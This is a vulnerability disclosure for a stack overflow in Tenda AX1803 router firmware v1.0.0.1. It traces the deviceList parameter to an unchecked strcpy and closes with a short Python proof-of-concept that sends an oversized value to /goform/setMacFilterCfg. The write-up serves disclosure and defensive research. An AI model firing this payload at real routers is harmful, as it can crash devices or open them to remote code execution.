# Tenda AX1803 formSetMacFilterCfg
### Overview
vendor: Tenda

product: AX1803

version: v1.0.0.1

type: Stack Overflow
### Vulnerability Description
Tenda AX1803 v1.0.0.1 were discovered to contain a stack overflow via the deviceList parameter in the formSetMacFilterCfg function.

### Vulnerability details
In function formSetMacFilterCfg line 17, it reads in a user-provided parameter `deviceList`. The variable `v4` is passed as a parameter to the `sub_6483C` function. Function `sub_6483C` takes this variable as a parameter and passes it into function `sub_6302C`. Function `sub_6302C` calls function `sub_5E250`, where the first parameter is the variable `a2`(actually the variable `v4`) and the second parameter is the stack-based buffer `s_2`. In function `sub_5E250`, the variable `s_1`(actually the variable `v4`) is passed to the `strcpy` function without any length check, which may overflow the stack-based buffer `dest`(actually the variable `s_2`). As a result, by requesting the page, an attacker can easily execute a denial of service attack or remote code execution.

![](images/1.png)
![](images/2.png)
![](images/3.png)
![](images/4.png)

### POC
```python
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/setMacFilterCfg"

data = {
    "macFilterType": "white",
    "deviceList": "a" * 1000 + "\r" + "b" * 1000
}


response = requests.get(url, params=data)
print(response.text)
```
